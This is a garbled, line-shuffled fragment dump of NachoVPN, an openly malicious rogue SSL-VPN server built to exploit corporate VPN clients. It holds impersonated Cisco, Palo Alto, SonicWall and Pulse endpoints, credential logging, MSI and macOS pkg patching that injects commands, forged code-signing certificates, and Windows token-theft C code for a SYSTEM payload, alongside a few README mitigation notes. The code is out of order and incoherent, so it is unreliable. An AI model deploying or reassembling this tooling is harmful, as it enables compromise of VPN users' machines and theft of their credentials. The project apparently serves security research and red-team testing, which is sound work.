"        ""scapy>=2.5.0"","
"        ).sign(self.ca_key, hashes.SHA256(), default_backend())"
"        <entry name=""192.168.1.157"">"
"        <entry name=""192.168.69.45"">"
"        <entry name=""GP-GD-Internal"">"
"        <entry name=""GP-Lon-DC-Internal"">"
"        <entry name=""LDN-GWay"">"
"        <entry name=""{{ dns_name }}"">"
"        <img src=""https://github.com/AmberWolfCyber/NachoVPN/actions/workflows/build-docker.yml/badge.svg"" /></a>"
"        <img src=""https://img.shields.io/badge/License-MIT-yellow.svg"" /></a>"
"        <table id=""bottom-bar-table"">"
"        @self.flask_app.route('/', defaults={'path': ''}, methods=['CONNECT'])"
"        @self.flask_app.route('/', methods=['POST'])"
"        @self.flask_app.route('/<path:path>', methods=['CONNECT'])"
"        @self.flask_app.route('/CACHE/stc/profiles/profile.xml', methods=['GET'])"
"        @self.flask_app.route('/api/v1/healthcheck', methods=['GET'])"
"        @self.flask_app.route('/api/v2/healthcheck', methods=['GET'])"
"        @self.flask_app.route('/cgi-bin/epcs', methods = ['POST', 'GET'])"
"        @self.flask_app.route('/cgi-bin/extendauthentication', methods = ['POST', 'GET'])"
"        @self.flask_app.route('/cgi-bin/getaovconf', methods = ['POST', 'GET'])"
"        @self.flask_app.route('/cgi-bin/sslvpnclient', methods = ['POST', 'GET'])"
"        @self.flask_app.route('/cgi-bin/tunneltype', methods = ['POST', 'GET'])"
"        @self.flask_app.route('/cgi-bin/userLogin', methods = ['POST', 'GET'])"
"        @self.flask_app.route('/global-protect/getconfig.esp', methods=['GET', 'POST'])"
"        @self.flask_app.route('/global-protect/getmsi.esp', methods=['GET', 'POST'])"
"        @self.flask_app.route('/global-protect/prelogin.esp', methods=['GET', 'POST'])"
"        @self.flask_app.route('/msi/<file_name>', methods=['GET'])"
"        @self.flask_app.route('/ssl-vpn/getconfig.esp', methods=['GET', 'POST'])"
"        @self.flask_app.route('/ssl-vpn/login.esp', methods=['GET', 'POST'])"
"        @self.flask_app.route('/ssl-vpn/prelogin.esp', methods=['GET', 'POST'])"
"        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)"
"        ],"
"        apple_certificate = builder.sign(self.ca_key, hashes.SHA256(), default_backend())"
"        avp_bytes = self.code.to_bytes(4, 'big')"
"        buf.write(get_signature(key_file,"
"        ca = db.OpenView(""INSERT INTO "
"        cab_name = f""_{random_hash()}"""
"        cert_path = os.path.join('certs', 'sonicwall.cer')"
"        client_socket.sendall(b""PONG"
"        code = int.from_bytes(data[:4], 'big')"
"        codesign_certificate = builder.sign(self.ca_key, hashes.SHA256(), default_backend())"
"        command=command,"
"        compressed_hash=hashlib.sha1(dist_file_compressed).hexdigest(),"
"        compressed_length=len(dist_file_compressed),"
"        content_length = int(handler.headers.get('Content-Length', 0))"
"        contents = root.findall('.//s3:Contents', ns)"
"        creation_time=datetime.datetime.now().strftime(""%Y-%m-%dT%H:%M:%S"")"
"        data_offset=data_offset,"
"        db = msilib.OpenDatabase(msi_path, msilib.MSIDBOPEN_DIRECT)"
"        db = msilib.OpenDatabase(msi_path, msilib.MSIDBOPEN_READONLY)"
"        def chunk_data(data, size):"
"        def sni_callback(sslsocket, sni_name, sslcontext):"
"        default_dir = os.path.join(os.path.dirname(__file__), 'templates')"
"        ether_str = ETHER_TYPES.get(ether_type, 'UNKNOWN')"
"        ether_type = int.from_bytes(buf.read(2), 'big')"
"        except (socket.timeout, ssl.SSLError, ssl.CertificateError, OSError) as e:"
"        extracted_hash=hashlib.sha1(dist_file).hexdigest(),"
"        extracted_length=len(dist_file),"
"        for header, value in response.headers:"
"        for i, chunk in enumerate(chunk_data(data, length)):"
"        for msi_file in [""GlobalProtect.msi"", ""GlobalProtect64.msi""]:"
"        for name, plugin in inspect.getmembers(nachovpn.plugins, inspect.isclass):"
"        if (!AdjustTokenPrivileges(newToken, FALSE, "
"        if (!CreateProcessAsUserW(newToken, L""C:"
"        if (!DuplicateTokenEx(privToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, "
"        if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, "
"        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES "
"        if (!SetTokenInformation(newToken, TokenSessionId, (void"
"        if (wcscmp(processName, processInfo.szExeFile) == 0) {"
"        if int.from_bytes(data[0:4], 'big') != 79:"
"        if int.from_bytes(data[0:4], 'big') != JUNIPER_1:"
"        if isinstance(data, str):"
"        if len(data) >= 4 and int.from_bytes(data[:4], 'big') == VENDOR_TCG:"
"        if not hasattr(self, 'template_env'):"
"        if not os.path.exists(os.path.join(self.download_dir, ""GlobalProtect.msi"")) or "
"        if not os.path.exists(os.path.join(self.payload_dir, ""GlobalProtect.msi"")) or "
"        if not os.path.exists(pfx_path) or not self.cert_manager.cert_is_valid(cert_path, ""SONICWALL INC.""):"
"        if os.getenv('USE_DYNAMIC_SERVER_THUMBPRINT', 'false').lower() == 'true' or "
"        if os.getenv('USE_DYNAMIC_SERVER_THUMBPRINT', 'false').lower() == 'true':"
"        if os.name == ""nt"":"
"        if os.name == ""posix"" and not os.path.exists('/usr/bin/msidump'):"
"        if os.name == ""posix"" and not os.path.exists('/usr/bin/osslsigncode'):"
"        if os.path.exists(os.path.join(self.payload_dir, ""GlobalProtect.msi"")) and "
"        if os.path.exists(os.path.join(self.payload_dir, 'NACAgent.exe')) and "
"        if patcher.add_custom_action(args.output, f""_{random_hash()}"", action_type, source, target, sequence):"
"        if plugin_class.__name__ in os.getenv(""DISABLED_PLUGINS"", """").split("",""):"
"        input_file = os.path.join(self.payload_dir, 'NACAgent.exe')"
"        installation_check=installation_check,"
"        key_path = os.path.join('certs', 'sonicwall.key')"
"        latest_version_x86, latest_version_x64 = self.get_latest_versions()"
"        length = int.from_bytes(data[4:8], 'big') "
"        length = int.from_bytes(data[6:8], 'big')"
"        logging.info("""
"        logging.info(""Adding new Media entry"")"
"        logging.info(""Generating new CA certificate"")"
"        logging.info(f""Added file to MSI: {file_name}"")"
"        logging.info(f""Component key: {component_key}"")"
"        logging.info(f""ExamplePlugin::can_handle_data: Received data from {client_ip}: {data.hex()}"")"
"        logging.info(f""ExamplePlugin::handle_data: Received data from {client_ip}: {data.hex()}"")"
"        logging.info(f""Existing max DiskId: {max_disk_id}"")"
"        logging.info(f""File key: {file_key}"")"
"        logging.info(f""New DiskId: {new_disk_id}"")"
"        logging.info(f""New Media entry: DiskId {new_disk_id}"")"
"        logging.info(f""Registered plugin: {plugin_class.__name__}"")"
"        logging.info(f""Saving codesigning certificate to {pfx_path}"")"
"        logging.info(f""Sending DPD-RESP: {resp.hex()}"")"
"        logging.info(f""Sending KEEPALIVE: {resp.hex()}"")"
"        logging.info(f""Sequence number: {new_sequence}"")"
"        logging.info(f""[{plugin_name}] {self.client_address[0]} - - {format % args}"")"
"        major, minor, patch = map(int, version.split('.'))"
"        message_identifier = int.from_bytes(reader.read(4), 'big')"
"        message_length = int.from_bytes(reader.read(4), 'big')"
"        message_type = int.from_bytes(reader.read(4), 'big')"
"        os.makedirs(cert_dir, exist_ok=True)"
"        os.makedirs(self.download_dir, exist_ok=True)"
"        os.makedirs(self.output_dir, exist_ok=True)"
"        os.makedirs(self.payload_dir, exist_ok=True)"
"        output_file = os.path.join(self.payload_dir, 'NACAgent.exe')"
"        output_file = os.path.join(self.payload_dir, 'NACAgent.exe.signed')"
"        package_id=package_id,"
"        package_name=package_name,"
"        packet_length = int.from_bytes(buf.read(2), 'big')"
"        parser.error ('You must supply --cert, --key and --ca-cert together')"
"        pfx_path = os.path.join('certs', 'sonicwall.pfx')"
"        pkg_path = os.path.join(self.payload_dir, ""GlobalProtect.pkg"")"
"        plugin_name = getattr(self, 'plugin_name', 'Default')"
"        print (""Usage: %s <config_file>"" % sys.argv[0])"
"        print(""File added to MSI"")"
"        print(""MSI version incremented"")"
"        print(""Warning: Writing unmodified MSI as no changes were requested"")"
"        print(f""Config type: {config_type:08x}"")"
"        print(f""Downloading file from: {url}"")"
"        print(f""Downloading latest MSI files (version: {latest_version_x86.split('/')[0]})"")"
"        print(f""Downloading: {self.x64_msi}"")"
"        print(f""Downloading: {self.x86_msi}"")"
"        print(f""Latest x64 version: {x64_version.split('/')[0]}"")"
"        print(f""Latest x86 version: {x86_version.split('/')[0]}"")"
"        print(f""Successfully downloaded {self.x86_msi} and {self.x64_msi}"")"
"        proc = subprocess.run([""/usr/bin/osslsigncode"", 'sign', '-pkcs12', pfx_path, '-in', input_file, '-out', output_file],"
"        rec.SetInteger(1, new_disk_id)"
"        rec.SetInteger(2, new_sequence)"
"        rec.SetInteger(2, type)         "
"        rec.SetInteger(3, 1)            "
"        rec.SetInteger(4, 256)    "
"        rec.SetInteger(4, file_size)"
"        rec.SetInteger(7, 512)  "
"        rec.SetInteger(8, new_sequence)"
"        rec.SetString(1, component_key)"
"        rec.SetString(1, feature_key)"
"        rec.SetString(1, file_key)"
"        rec.SetString(1, name)          "
"        rec.SetString(1, source_key)"
"        rec.SetString(2, """")            "
"        rec.SetString(2, '{' "
"        rec.SetString(2, component_key)"
"        rec.SetString(2, source)"
"        rec.SetString(3, '')"
"        rec.SetString(3, 'TARGETDIR')"
"        rec.SetString(3, file_name)"
"        rec.SetString(3, source_key)    "
"        rec.SetString(4, f'"
"        rec.SetString(4, target)        "
"        rec.SetString(5, '')"
"        rec.SetString(6, '')"
"        rec.SetString(6, file_key)"
"        resp = self.Constants.MAGIC_NUMBER.to_bytes(4, 'big')"
"        resp = self.create_packet(self.PacketType.DPD_RESP, req_data)"
"        response = requests.get(url, stream=True)"
"        return bytes(map(int, ip.split('.')))"
"        return cert_path, key_path"
"        return cls(code, flags, vendor, value)"
"        return cls(vendor, code, identifier, eap_data)"
"        return cls(vendor_id, message_type, message_identifier, message_value)"
"        return f""AVP: Code={self.code}, Length={self.length}, "" "
"        return f""{major}.{minor}.{patch}"""
"        return f'EAP Packet: Vendor={hex(self.vendor)}, Code={self.code}, Identifier={hex(self.identifier)}, ' "
"        return f'IF-T Packet: Vendor={hex(self.vendor_id)}, Message Type={self.message_type}, ' "
"        return latest_version_x86, latest_version_x64"
"        return len(data) >= 4 and CTSP.Constants.MAGIC_NUMBER == int.from_bytes(data[:4], byteorder='big')"
"        return len(data) >= 4 and b""PING"" in data[:4]"
"        return self.ca_key_path, self.ca_cert_path"
"        return self.generate_server_certificate(self.dns_cert_path, self.dns_key_path, self.dns_name, "
"        return self.generate_server_certificate(self.ip_cert_path, self.ip_key_path, self.ip_address,"
"        return self.vendor.to_bytes(4, 'big') "
"        return self.vendor_id.to_bytes(4, 'big') "
"        return struct.pack('<I', value)"
"        return struct.pack('>H', value)"
"        return struct.pack('>HH', attr_type, len(data)) "
"        return struct.pack('>I', value)"
"        return {'sha1': thumbprint_sha1, 'md5': thumbprint_md5}"
"        return {'type': self.attr_type, 'len': self.attr_len, 'data': self.data}"
"        self.anonymous_auth = os.getenv(""PULSE_ANONYMOUS_AUTH"", ""false"").lower() == 'true'"
"        self.apple_cert_path = os.path.join('certs', 'paloalto-apple.cer')"
"        self.apple_key_path = os.path.join('certs', 'paloalto-apple.key')"
"        self.ca_cert_path = os.path.join(self.cert_dir, 'ca.crt')"
"        self.ca_key_path = os.path.join(self.cert_dir, 'ca.key')"
"        self.cisco_command_macos = os.getenv(""CISCO_COMMAND_MACOS"", ""touch /tmp/pwnd"")"
"        self.cisco_command_win = os.getenv(""CISCO_COMMAND_WIN"", ""calc.exe"")"
"        self.codesign_cert_path = os.path.join('certs', 'paloalto-codesign.cer')"
"        self.codesign_key_path = os.path.join('certs', 'paloalto-codesign.key')"
"        self.codesign_pfx_path = os.path.join('certs', 'paloalto-codesign.pfx')"
"        self.dns_cert_path = os.path.join(self.cert_dir, f""server-dns.crt"")"
"        self.dns_key_path = os.path.join(self.cert_dir, f""server-dns.key"")"
"        self.dns_name = os.getenv('SERVER_FQDN', socket.gethostname())"
"        self.dns_suffix = os.getenv(""PULSE_DNS_SUFFIX"", ""nachovpn.local"")"
"        self.download_dir = os.path.join(os.getcwd(), 'downloads')"
"        self.download_file(x64_url, x64_path)"
"        self.download_file(x86_url, x86_path)"
"        self.files_dir = os.path.join(os.path.dirname(__file__), ""files"")"
"        self.files_dir = os.path.join(os.path.dirname(__file__), 'files')"
"        self.handle_attr_elements(p, l, self.post_attributes)"
"        self.ip_address = os.getenv('EXTERNAL_IP', socket.gethostbyname(socket.gethostname()))"
"        self.ip_cert_path = os.path.join(self.cert_dir, f""server-ip.crt"")"
"        self.ip_key_path = os.path.join(self.cert_dir, f""server-ip.key"")"
"        self.log_credentials(username, password)"
"        self.logger.debug(f""New connection: {src_ip}:{sport} -> {dst_ip}:{dport} (NAT port: {nat_port})"")"
"        self.logger.debug(f""Processing TCP packet: {src_ip}:{sport} -> {dst_ip}:{dport}"")"
"        self.logger.debug(f""Received SSL-VPN Packet from {client_ip}: Magic={magic.hex()}, "" "
"        self.logger.info(""MSI files patched"")"
"        self.logger.info(""MSI files verified"")"
"        self.logger.info(f""AVP: Code={avp.code:04X}, Value={avp.value.hex()}"")"
"        self.logger.info(f""Handling CONNECT for {handler.path}"")"
"        self.logger.info(f""Latest MSI version: {version}"")"
"        self.logger.info(f""Received packet: {packet}"")"
"        self.logger.info(f""{os.path.join(self.payload_dir, 'NACAgent.exe')} verified"")"
"        self.logon_script = os.getenv(""PULSE_LOGON_SCRIPT"", ""C:"
"        self.logon_script_macos = os.getenv(""PULSE_LOGON_SCRIPT_MACOS"", """")"
"        self.msi_add_file = os.getenv(""PALO_ALTO_MSI_ADD_FILE"", None)"
"        self.msi_force_patch = os.getenv(""PALO_ALTO_FORCE_PATCH"", False)"
"        self.msi_increment_version = os.getenv(""PALO_ALTO_MSI_INCREMENT_VERSION"", True)"
"        self.packet_handler = PacketHandler(write_pcap=self.write_pcap, pcap_filename=self.pcap_filename, logger_name=self.__class__.__name__)"
"        self.payload_dir = os.path.join(os.getcwd(), 'payloads')"
"        self.pcap_filename = os.path.join(""pcaps"", f""{self.__class__.__name__.lower().rstrip('plugin')}.pcap"")"
"        self.pkg_command = os.getenv(""PALO_ALTO_PKG_COMMAND"", ""touch /tmp/pwnd"")"
"        self.pulse_save_connection = os.getenv(""PULSE_SAVE_CONNECTION"", ""false"").lower() == 'true'"
"        self.pulse_username = os.getenv(""PULSE_USERNAME"", """")"
"        self.socket = cert_manager.ssl_context.wrap_socket(self.socket, server_side=True)"
"        self.vpn_name = os.getenv(""VPN_NAME"", ""NachoVPN"")"
"        self.x64_msi = ""GlobalProtect64.msi"""
"        self.x86_msi = ""GlobalProtect.msi"""
"        self.xml_url = ""https://pan-gp-client.s3.amazonaws.com"""
"        sendp(packet, verbose=False, iface=conf.iface)"
"        seq = db.OpenView(""INSERT INTO "
"        sig_toc_entry = build_signature_toc([signing_cert, ca_cert], sig_len)"
"        signature_length=signature_length,"
"        signature_toc_entry=sig_toc_entry,"
"        sniff(iface=conf.iface, prn=packet_callback, store=False)"
"        source_file = os.path.join(self.files_dir, 'NACAgent.c')"
"        super().__init__(request, client_address, server)"
"        super().__init__(server_address, RequestHandlerClass)"
"        super().send_header(keyword, value)"
"        test_sig = get_signature(key_file, b""foobar"")"
"        thumbprint_md5 = os.getenv('SERVER_MD5_THUMBPRINT', thumbprint_md5)"
"        thumbprint_sha1 = os.getenv('SERVER_SHA1_THUMBPRINT', thumbprint_sha1)"
"        total_size = int(response.headers.get('content-length', 0))"
"        user_agent = handler.headers.get('User-Agent', '')"
"        vendor = int.from_bytes(data[:4], 'big')"
"        vendor_id = int.from_bytes(reader.read(4), 'big')"
"        version_file = os.path.join(self.download_dir, ""msi_version.txt"")"
"        view = db.OpenView(""INSERT INTO "
"        view = db.OpenView(""SELECT "
"        view = db.OpenView(""SELECT Value FROM Property WHERE Property='ProductVersion'"")"
"        with open(cert_file, ""rb"") as f:"
"        with open(cert_path, 'rb') as f:"
"        with open(cert_path, 'wb') as cert_file:"
"        with open(cert_path, 'wb') as f:"
"        with open(file_path, 'rb') as f:"
"        with open(filename, ""r"") as f:"
"        with open(key_file, 'rb') as f:"
"        with open(key_path, 'wb') as f:"
"        with open(key_path, 'wb') as key_file:"
"        with open(os.path.join(args.output_dir, ""msi_version.txt""), ""w"") as f:"
"        with open(output_path, 'wb') as f:"
"        with open(pfx_path, ""wb"") as f:"
"        with open(pkg_path, 'wb') as f:"
"        with open(self.ca_cert_path, 'wb') as f:"
"        with open(self.ca_key_path, 'wb') as f:"
"        with open(self.cert_manager.ca_cert_path, 'r') as f:"
"        with open(version_file, ""r"") as f:"
"        x64_keys = [c.find('s3:Key', ns).text for c in contents if 'GlobalProtect64.msi' in c.find('s3:Key', ns).text]"
"        x64_path = os.path.join(self.output_dir, self.x64_msi)"
"        x64_url = f""{self.xml_url}/{latest_version_x64}"""
"        x86_keys = [c.find('s3:Key', ns).text for c in contents if 'GlobalProtect.msi' in c.find('s3:Key', ns).text]"
"        x86_path = os.path.join(self.output_dir, self.x86_msi)"
"        x86_url = f""{self.xml_url}/{latest_version_x86}"""
"        x86_version, x64_version = downloader.get_latest_versions()"
"       not os.path.exists(os.path.join(args.output_dir, ""GlobalProtect64.msi"")) or args.force):"
"      - ""443:443"""
"      - ""80:80"""
"      system.run('/bin/bash', '-c', '{command}')"
"    """""""
"    'CiscoPlugin',"
"    'PaloAltoPlugin',"
"    'PulseSecurePlugin',"
"    'SonicWallPlugin',"
"    'VPNPlugin',"
"    --domain ""$SERVER_FQDN"""
"    <a href=""LICENSE"" alt=""License: MIT"">"
"    <a href=""https://github.com/AmberWolfCyber/NachoVPN/actions/workflows"" alt=""Docker Build"">"
"    <archived-checksum style=""sha1"">{compressed_hash}</archived-checksum>"
"    <div id=""legcyUIWarning"" class=""bottom-bar-container"" style=""display:none"">"
"    <encoding style=""application/x-gzip""/>"
"    <entry name=""GlobalProtectCA"">"
"    <extracted-checksum style=""sha1"">{extracted_hash}</extracted-checksum>"
"    <img src=""logo.png"">"
"    <installation-check script=""{installation_check}()""/>"
"    <options allow-external-scripts=""true""/>"
"    <options customize=""never""/>"
"    <options hostArchitectures=""x86_64,arm64""/>"
"    <pkg-ref id=""com.{package_id}""/>"
"    <pkg-ref id=""woot.pkg"">"
"    DWORD dwPid = FindProcessId(L""NEGui.exe"")"
"    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)"
"    ProcessIdToSessionId(dwPid, "
"    ],"
"    buf.write(struct.pack('>Q', len(toc_compressed)))   "
"    buf.write(struct.pack('>Q', len(toc_xml)))          "
"    cert_args = [args.apple_key, args.apple_cert, args.ca_cert]"
"    cp ""/etc/letsencrypt/live/$SERVER_FQDN/fullchain.pem"" ""$CERT_PATH"""
"    cp ""/etc/letsencrypt/live/$SERVER_FQDN/privkey.pem"" ""$KEY_PATH"""
"    def __init__(self, "
"    def __init__(self, attr_type, attr_len, data):"
"    def __init__(self, cert_dir=os.path.join(os.getcwd(), 'certs'), ca_common_name=""VPN Root CA""):"
"    def __init__(self, cert_manager=None, write_pcap=False, external_ip=None, dns_name=None, db_manager=None, template_dir=None):"
"    def __init__(self, code, flags=0, vendor=None, value=b''):"
"    def __init__(self, data):"
"    def __init__(self, data, socket, packet_handler=None):"
"    def __init__(self, db_path='database.db'):"
"    def __init__(self, host='0.0.0.0', port=443, cert_dir=os.path.join(os.getcwd(), 'certs')):"
"    def __init__(self, logon_script=""C:"
"    def __init__(self, output_dir):"
"    def __init__(self, request, client_address, server):"
"    def __init__(self, server_address, RequestHandlerClass, cert_manager, plugin_manager):"
"    def __init__(self, vendor=None, code=None, identifier=None, eap_data=b''):"
"    def __init__(self, vendor_id=None, message_type=None, message_identifier=None, message_value=None):"
"    def __init__(self, write_pcap=False, pcap_filename=None, logger_name=""PacketHandler""):"
"    def _send_flask_response(self, response, handler):"
"    def add_custom_action(self, msi_path, name, type, source, target, sequence):"
"    def add_file(self, msi_path, file_path, component_name, feature_name):"
"    def append_to_pcap(self, packet):"
"    def auth_completed(self, data):"
"    def can_handle_data(self, data, client_socket, client_ip):"
"    def can_handle_http(self, handler):"
"    def cert_is_valid(self, cert_path, common_name):"
"    def create_attribute(attr_type, data):"
"    def create_cab_file(file_path, file_key, output_path):"
"    def create_packet(self, packet_type, data=b''):"
"    def download_file(self, url, output_path):"
"    def extract_credentials(self, data):"
"    def forward_tcp_packet(self, packet_data):"
"    def from_bytes(cls, data):"
"    def from_io(cls, reader):"
"    def generate_apple_certificate(self, common_name=""Developer ID Installer"", cert_path=None, key_path=None):"
"    def generate_codesign_certificate(self, common_name, pfx_path=None, cert_path=None, key_path=None):"
"    def generate_server_certificate(self, cert_path, key_path, common_name="""
"    def get_cert_thumbprint(self, cert_path):"
"    def get_higher_version(self, version):"
"    def get_msi_version(self, msi_path):"
"    def get_thumbprint_from_server(self, server_address):"
"    def handle_attr_elements(self, data, attr_len, attrs):"
"    def handle_client_packet(self, packet_data):"
"    def handle_connect(self, handler):"
"    def handle_data(self, data, client_socket, client_ip):"
"    def handle_get(self, handler):"
"    def handle_head(self, handler):"
"    def handle_http(self, handler):"
"    def handle_post(self, handler):"
"    def has_credentials(self, data):"
"    def hexdump(data, length=16):"
"    def increment_msi_version(self, msi_path):"
"    def is_client_info(self, data):"
"    def log_credentials(self, username, password, other_data=None):"
"    def log_credentials(self, username, password, plugin_name, other_data=None):"
"    def log_message(self, format, "
"    def parse_eap_packet(self, data, client_socket):"
"    def process(self, data, client_socket):"
"    def process_attr(self, attr_type, data, attr_len):"
"    def process_tcp_message(self, client_socket, data, client_ip):"
"    def register_plugin(self, plugin_class, "
"    def render_file(self, filename, context):"
"    def render_template(self, template_name, "
"    def send_dpd_resp(self, req_data):"
"    def send_header(self, keyword, value):"
"    def shasum(self, data):"
"    def to_bytes(self, include_padding=False):"
"    description=""A tasty, but malicious SSL-VPN server"","
"    echo ""  Certificate: $CERT_PATH"""
"    echo ""  Key: $KEY_PATH"""
"    echo ""Certbot failed to generate the certificate."""
"    echo ""Certificate and key copied to:"""
"    echo ""Certificate successfully generated."""
"    elif args.download and (not os.path.exists(os.path.join(args.output_dir, ""GlobalProtect.msi"")) or "
"    filename = os.path.join(output_dir, 'vpn_config.bin')"
"    group.add_argument('-d', '--download', action='store_true', help='Download latest MSI files')"
"    group.add_argument('-v', '--version', action='store_true', help='Show latest version information only')"
"    if (Process32FirstW(processesSnapshot, "
"    if (WTSQueryUserToken(sessionId, "
"    if args.add_file and patcher.add_file(args.output, args.add_file, random_hash(), args.feature):"
"    include_package_data=True,"
"    level=logging.INFO,"
"    name=""nachovpn"","
"    outbuf = generate_pkg(args.version, args.command, "
"    output_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'test')"
"    package_dir={"""": ""src""},"
"    package_id = '{}.{}'.format(random_string(6).lower(), random_string(6).lower())"
"    packages=find_packages(where=""src""),"
"    parser.add_argument(""--ca-cert"", help=""CA Certificate"", dest=""ca_cert"")"
"    parser.add_argument(""-a"", ""--apple-cert"", help=""Signing certificate"")"
"    parser.add_argument(""-c"", ""--command"", help=""Command to execute"", required=True)"
"    parser.add_argument(""-k"", ""--apple-key"", help=""Key for signing certificate"")"
"    parser.add_argument(""-n"", ""--name"", required=True, help=""Package name. Defaults to the output file name"")"
"    parser.add_argument(""-o"", ""--output"", required=True, help=""Output file"")"
"    parser.add_argument(""-v"", ""--version"", required=True, help=""CFBundleVersion for the PKG file"")"
"    parser.add_argument('--add-file', help='Path to file to be added to the MSI', required=False)"
"    parser.add_argument('--feature', help='Feature to add the file to', default=""auto"")"
"    parser.add_argument('--increment', help=""Increment MSI version"", action='store_true')"
"    parser.add_argument('-c', '--command', help='Command to inject into MSI', required=False)"
"    parser.add_argument('-f', '--force', action='store_true', help='Force download even if files exist')"
"    parser.add_argument('-f', '--force', help=""Delete output file if it exists"", action='store_true')"
"    parser.add_argument('-i', '--input', help='Input MSI file to add custom action to', required=True)"
"    parser.add_argument('-o', '--output', help='Output file to write the patched MSI to', required=True)"
"    parser.add_argument('-o', '--output-dir', default=os.path.join(os.getcwd(), 'downloads'),"
"    print(f""Generated VPN config. Saved to {filename}"")"
"    python_requires="">=3.9"","
"    return int.from_bytes(data[0:2], 'big')"
"    return int.from_bytes(data[0:2], 'little')"
"    return int.from_bytes(data[0:4], 'big')"
"    return int.from_bytes(data[0:4], 'little')"
"    sequence = ""InstallExecuteSequence"""
"    shutil.copy(args.input, args.output)"
"    si.lpDesktop = L""Winsta0"
"    source = ""C:"
"    srp, sendp, conf, get_if_addr, get_if_hwaddr, getmacbyip, sniff"
"    version=""1.0.0"","
"    warnings.filterwarnings(""ignore"", category=DeprecationWarning)"
"    while (Process32NextW(processesSnapshot, "
"    with open (sys.argv[1], 'rb') as f:"
"    with open(args.output, 'wb') as f:"
"    with open(filename, 'wb') as f:"
"    {'type': ROUTE_SPLIT_INCLUDE, 'route': '0.0.0.0/0.0.0.0'},"
"    },"
"   <div id=""neInstallRebootPage"" style=""top:10px"
"  <KeyInfo xmlns=""http://www.w3.org/2000/09/xmldsig"
"  <Profile service-type=""ampenabler"">"
"  <Profile service-type=""feedback"">"
"  <Profile service-type=""iseposture"">"
"  <Profile service-type=""iseposturejson"">"
"  <Profile service-type=""nam"">"
"  <Profile service-type=""nvm"">"
"  <Profile service-type=""umbrella"">"
"  <Profile service-type=""user"">"
"  <Profile service-type=""vpn-mgmt"">"
"  <checksum style=""sha1"">"
"  <file id=""1"">"
"  <file version=""3.9.04053"" id=""VPNCore"" is_core=""yes"" type=""msi"" action=""install"" os=""win:6.1.7601"">"
"  <file version=""4.9.04053"" id=""AMPEnabler"" is_core=""no"" type=""msi"" action=""install"" module=""ampenabler"" os=""win:6.1.7601"">"
"  <file version=""4.9.04053"" id=""DART"" is_core=""no"" type=""msi"" action=""install"" module=""dart"" os=""win:6.1.7601"">"
"  <file version=""4.9.04053"" id=""ISEPosture"" is_core=""no"" type=""msi"" action=""install"" module=""iseposture"" os=""win:6.1.7601"">"
"  <file version=""4.9.04053"" id=""NAM"" is_core=""no"" type=""msi"" action=""install"" module=""nam"" os=""win:6.1.7601"">"
"  <file version=""4.9.04053"" id=""NVM"" is_core=""no"" type=""msi"" action=""install"" module=""nvm"" os=""win:6.1.7601"">"
"  <file version=""4.9.04053"" id=""Posture"" is_core=""no"" type=""msi"" action=""install"" module=""posture"" os=""win:6.1.7601"">"
"  <file version=""4.9.04053"" id=""Umbrella"" is_core=""no"" type=""msi"" action=""install"" module=""umbrella"" os=""win:6.1.7601"">"
"  <file version=""4.9.04053"" id=""gina"" is_core=""no"" type=""msi"" action=""install"" module=""vpngina"" os=""win:6.1.7601"">"
"  echo ""Certificate and key already exist. Skipping Certbot execution."""
"  echo ""Error: EXTERNAL_IP is not set or is empty"""
"  echo ""Error: SERVER_FQDN is not set or is empty"""
"  echo ""SKIP_CERTBOT is set. Skipping Certbot execution."""
"  var expires = ""expires="""
" ""="" "
" '}', 'TARGETDIR', 256, '', file_key])"
" (50-progress)}] {current_size}/{total_size} bytes"")"
" (self.flags << 24)).to_bytes(4, 'big')"
" -f ""$KEY_PATH"" ]]"
" = 'ProductCode'"")"
" = 'ProductVersion'"")"
" Add fake layer 2 data to the packet, if missing"
" Calculate the initial length (8 bytes for the header, optionally 4 bytes for the vendor, plus the value length)"
" Condition (probably want to use ""NOT Installed"")"
" Consider using an Application Control policy, such as WDAC, or an EDR solution to ensure that only approved executables and scripts can be executed by the VPN client."
" EAP Packet: Vendor=0xa4c01, Code=2, Identifier=0x1, Length=14, Data=01616e6f6e796d6f7573"
" EAP Packet: Vendor=0xa4c01, Code=2, Identifier=0x2, Length=296, Data=fe000a4c0000000100000d4980000010000005830000000400000d61 .."
" EAP Packet: Vendor=0xa4c01, Code=2, Identifier=0x3, Length=56, Data=fe000a4c0000000100000d6d8000001000000583616161610000004f4000001a02000012fe000a4c000000020202056161610583"
" EAP Packet: Vendor=0xa4c01, Code=2, Identifier=0x4, Length=28, Data=fe000a4c0000000100000d6b800000100000058300000010"
" For convenience, a default "
" If the payload already exists and is validly signed, skip compilation/signing"
" In order to simulate a valid codesigning certificate for the SonicWall plugin, NachoVPN will sign the "
" It is recommended to use a TLS certificate that is signed by a trusted Certificate Authority. The docker container automates this process for you, using certbot. If you do not use a trusted certificate, then NachoVPN will generate a self-signed certificate instead, which in most cases will either cause the client to prompt with a certificate warning, or it will refuse to connect unless you modify the client settings to accept self-signed certificates. For the Palo Alto GlobalProtect plugin, this will also cause the MSI installer to fail."
" Most VPN clients support the concept of locking down the VPN profile to a specific endpoint, or using an always-on VPN mode. This should be enabled where possible."
" No data available, continue"
" No plugin handled the request, send 404"
" TODO: we may wish to check that the cert chains to a trusted root CA in the future,"
" TOKEN_WRITE, "
" The name of the VPN profile, which is presented to the client for Cisco AnyConnect. "
" URL=/cgi-bin/portal""></HEAD><BODY></BODY></HTML>')"
" URL=/cgi-bin/welcome""></HEAD><BODY></BODY></HTML>'"
" Unfortunately, in some cases this lockdown can be removed by a malicious local user, therefore it is also recommended to use host-based firewall rules to restrict the IP addresses that the VPN client can communicate with."
" [BlackHat 2008: Leveraging the Edge: Abusing SSL VPNs, Mike Zusman](https://www.blackhat.com/presentations/bh-usa-08/Zusman/BH_US_08_Zusman_SSL_VPN_Abuse.pdf)"
" [BlackHat 2019: Infiltrating Corporate Intranet Like NSA, Orange Tsai "
" [HackFest Hollywood 2024: Very Pwnable Networks: Exploiting the Top Corporate VPN Clients for Remote Root and SYSTEM Shells, Rich Warren "
" [NCC Group: Making New Connections: Leveraging Cisco AnyConnect Client to Drop and Run Payloads, David Cash "
" before triggering the exploit. For production use-cases, you will need to obtain a valid codesigning certificate from a public CA, sign your "
